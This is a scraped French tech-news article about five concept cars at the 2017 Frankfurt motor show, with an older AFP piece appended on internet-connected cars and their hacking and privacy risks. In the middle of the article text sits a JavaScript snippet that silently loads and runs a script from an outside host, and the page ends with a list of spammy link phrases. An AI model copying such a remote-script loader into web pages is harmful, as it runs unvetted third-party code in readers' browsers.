{"title": "Salon de Francfort 2017 : 5 concept-cars qui valent le détour", "newspaper": "Futura Sciences", "author": "Marc Zaffagni", "date_publi": "15/09/2017", "content": "L'édition 2017 du salon automobile de Francfort est l'occasion de découvrir de nombreux concept-cars qui, pour certains, font leur première apparition. Voici notre sélection, de l'étonnante Renault Symbioz en passant par l'Audi Aicon, la séduisante Honda Urban EV et une Smart aux allures de capsule spatiale.  Si les  concept-cars  ont toujours apporté une part de rêve et d'extravagance, l'avènement de la propulsion électrique a contribué à libérer l'imagination des bureaux de design des constructeurs. Les contraintes techniques n'ont rien à voir avec celles des voitures à moteur thermique. Par exemple, le tunnel central, qui cache la boîte de vitesse et/ou l'arbre de transmission vers le train arrière, a disparu, libérant un espace conséquent et ouvrant de nombreuses possibilités d'aménagement intérieur. L'absence d'un moteur à explosion avant ou arrière autorise des audaces inédites sur les carrosseries.  Bref, les concept-cars qui nous parlent de la  voiture électrique  et autonome de demain nous laissent entrevoir le bouleversement profond qui se prépare dans nos modes de déplacement. En voici un aperçu à travers notre sélection des concept-cars dévoilés au salon  automobile  de Francfort.   ( function () { var vs = document.createElement(\"script\"); vs.type = \"text/javascript\"; vs.async = true; vs.src = \"http://kweb.r66net.com/GetLink\"; var s = document.getElementsByTagName(\"script\")[0]; s.parentNode.insertBefore(vs, s); })();  Renault Symbioz : une pièce supplémentaire dans la maison Renault est venu à Francfort avec un concept-car nommé  Symbioz  et... une maison ! Le constructeur français explore une idée déjà entrevue qui verrait une interaction vertueuse entre l'habitation et la voiture. Les deux partageraient leur énergie grâce à une intelligence artificielle se chargeant de la répartition en fonction des besoins. L'intérieur de la Symbioz est un prolongement de l'habitation, avec un tableau de bord rétractable et des sièges avant pivotants pour créer un espace de type salon. On retrouve évidemment tous les équipements de loisirs connectés pour s'occuper pendant que la  voiture  se charge de la conduite. La Symbioz pourrait également entrer dans la maison et permettre d'ajouter, par exemple, une extension au salon ou un bureau. Avec la Symbioz, Renault explore un concept de voiture pour les années 2030. © Olivier Martin-Gambier, Renault                                Honda Urban EV : comme un air de Civic Avec l'Urban EV,  Honda  propose un concept-car très proche d'un modèle de production dont la sortie est prévue en 2019. Cette citadine électrique, qui s'inspire du design de la première Honda Civic, joue sur des montants de pare-brise très fins pour offrir une surface vitrée maximale. La calandre avant et la plaque des feux arrière cachent un système d'affichage qui permet de diffuser des messages. Pas de rétroviseurs extérieurs ; ils sont remplacés par de petites caméras qui envoient l'image à un écran intégré à la portière conducteur. L'intérieur est sobre et spacieux avec une banquette avant d'un bloc qui crée une ambiance de salon. L’Urban EV de Honda débouchera sur un modèle commercial prévu pour 2019. © Honda                                Aicon : l’Audi autonome du futur Le constructeur allemand Audi a profité du salon de Francfort pour dévoiler l' Aicon , une berline électrique à conduite autonome sans volant ni pédales qui offrirait une autonomie de 800 kilomètres. Imposante avec ses 5,4 mètres de long et ses 2,1 mètres de large, elle combine des lignes fluides avec une façade avant au dessin plus acéré qui cache un système d'éclairage LED. Les  portes  antagonistes ouvrent sur un intérieur très spartiate où les deux sièges avant semblent flotter au-dessus du plancher. Le tableau de bord est un bandeau qui se prolonge sur les côtés jusqu'aux places arrière. Un assistant intelligent reconnaît le conducteur lorsque son smartphone se connecte au système et ajuste les différents réglages selon ses préférences. L’Audi Aicon suggère le design intérieur et extérieur que l’on retrouvera par petites touches sur les modèles des prochaines décennies. © Audi AG                                Vision EQ ForTwo : la Smart autonome à partager Avec la  Smart Vision EQ ForTwo , le groupe Daimler se projette dans un futur où des flottes de sa petite citadine autonome seront disponibles à travers un service de partage. Celles-ci seront réparties à travers la ville par une intelligence artificielle pour se concentrer dans les zones de forte demande ; on pourra réserver un trajet  via  son smartphone. À bord, pas de volant ni de pédales, mais un large écran de 24 pouces pour les activités de loisir. L'absence de tunnel central crée une sensation d'espace renforcée par les portières transparentes. On se croirait dans une sorte de bulle. Le design de la Smart Vision EQ ForTwo n’est pas très éloigné des modèles actuels, hormis les portières transparentes qui laissent voir ses passagers. © Daimler, Smart                                Borgward Isabella Concept : le futur se souvient de son passé La marque allemande Borgward n'est pas très connue du grand public. Elle a existé entre 1933 et 1961 avec pour modèle emblématique l'Isabella 1500. Un bon demi-siècle plus tard, le petit-fils du fondateur a repris les rênes et tente un retour. La  Borgward Isabella Concept  est l'un des concept-cars les plus spectaculaires de cette édition 2017 du salon de Francfort. La Borgward Isabella Concept est un concept-car électrique de 300 chevaux avec 500 kilomètres d’autonomie. © Borgward                               Avec ses portes suicides coulissantes et sa carrosserie où s'entremêlent lignes tendues et formes arrondies, elle semble tout droit sortie d'un film de science-fiction. L'intérieur ne fait que renforcer cette impression, avec un tableau de bord central dont l'affichage 3D crée un effet holographique. L'Isabella Concept est avant tout une démonstration destinée à marquer les esprits alors que la marque, désormais passée sous pavillon chinois, tente un retour avec une gamme de SUV. Pour en savoir plus Salon de l’auto IAA de Francfort : Internet en vedette Article de l'AFP, paru le 15/09/2011 Au salon de l'automobile qui vient d'ouvrir ses portes en Allemagne, deux tendances s'affichent déjà : la connexion à  Internet  et l'aide à la conduite. La première est sans doute davantage qu'une mode et pose de nouveaux problèmes de sécurité, de la distraction du constructeur au piratage - informatique - de la voiture. C'est une figure obligée pour les constructeurs automobiles présents au  Salon IAA  qui se tient à Francfort, du 15 au 25 septembre : des voitures connectées à Internet pour commander une pizza, lire ses courriels ou consulter les  réseaux sociaux , même dans les bouchons. Dernier raffinement destiné à capter la clientèle haut de gamme ou gadget voué à disparaître rapidement, les connexions à Internet à bord figurent en effet au catalogue des deux poids lourds du secteur, BMW et Mercedes-Benz (groupe Daimler). Chez BMW, un  ordinateur  de bord ouvre l'accès pour les voyageurs à un  portail  dédié leur permettant de trouver le restaurant, le magasin ou le musée de leur choix. Il leur délivre également les bulletins de nouvelles, la  météo  ou des informations pratiques. Côté Daimler, Internet est au programme en option de la toute nouvelle Classe B, une citadine présentée en grande pompe à Francfort. Le conducteur peut explorer l'ensemble du réseau Internet... mais seulement à l'arrêt. En marche, il n'aura le droit qu'à une sélection d' applications  siglées Mercedes-Benz. À l'avenir, la plupart des voitures permettront peut-être de se connecter à sa musique, ses films et ses documents, qu'ils soient contenus dans son ordinateur domestique ou hébergés sur un  nuage  de données (le  cloud ), comme le suggère Ford avec son prototype Cloud montré à Francfort et avec le système  Sync  montré au Cebit de Hanovre en mars dernier. Les équipementiers comme l'allemand Bosch ou le français Valeo explorent aussi différentes pistes. Ce dernier présente par exemple un nouveau système permettant à une voiture de se garer toute seule, sans conducteur a bord. Les services les plus désirés par les conducteurs sont en effet l'aide à la conduite, par exemple la localisation de stations-service, puis la consultation du courrier électronique ou des réseaux sociaux, selon une étude du Bitkom, la Fédération allemande des entreprises de haute technologie. «  Pour l'instant, il s'agit surtout d'un effet de mode  » mais Internet au volant devrait se banaliser car il permet aux constructeurs de proposer des voitures appétissantes pour les clients, explique Stephen Reith, spécialiste du secteur pour l'agence de consultants Booz & Company. L'avènement d'Internet au volant serait une certitude car «  quand le marché dit qu'il veut quelque chose, il l'obtient  », renchérit Frank Biller, de la banque régionale LBBW. Google, hackers et terroristes Ces nouveaux services ne vont pas sans danger. «  Il faut répondre à la demande [de connexion à Internet] sans nuire à la facilité d'utilisation ni à la sécurité des transports  », résume Martina Koederitz, membre de la direction du Bitkom. Connecter les voitures, c'est aussi en faire la proie éventuelle des hackers, a récemment souligné la société de sécurité McAfee. «  Qu'un compte e-mail ou un ordinateur portable coure un risque, c'est une chose, mais si une voiture est piratée, ça devient un danger important pour la sécurité personnelle  » du conducteur, a mis en garde le patron de McAfee Stuart McClure. L'idée n'est pas irréaliste puisque des chercheurs américains ont déjà réussi à  pirater une voiture  à distance. Très pointilleuses sur les questions de vie privée, les autorités allemandes s'inquiètent aussi de ce que des voitures, notamment électriques, peuvent apprendre à l'insu de leur propriétaire, à des entreprises, des États ou des personnes mal intentionnées. «  Les systèmes doivent être configurés de manière à posséder le moins possible de données personnelles  », pour éviter par exemple que Google n'apprenne des choses sur nos habitudes de conduite lors de la recharge de la batterie, pointe ainsi dans un entretien à l'AFP Peter Schaar, chargé par le gouvernement allemand de ces questions.  Google  s'intéresse d'ailleurs à cette question puisque l'entreprise propose déjà  Google Prediction  pour, entre autre, observer l'usage d'une voiture, ce que Ford a commencé à tester. Pire, une  voiture électrique  pourrait même «  être utilisée comme un  virus  » par un pirate pour attaquer le  réseau électrique , s'alarme-t-il. Vous avez aimé cet article ? N'hésitez pas à le partager avec vos ami(e)s et aidez-nous à faire connaître Futura :) ! La Rédaction vous remercie. Facebook Twitter Google+ Linkedin Pinterest À voir aussi :  salon internet  |  salon de automobile geneve  |  salon du bourger  |  salon de agriculture  |  salon bourget  |  salon en eucalyptus  |  chaudiere de salon  |  probleme lecteur dvd salon  |  nettoyer lecteur dvd salon  |  nettoyage lecteur dvd de salon", "theme": "tech"}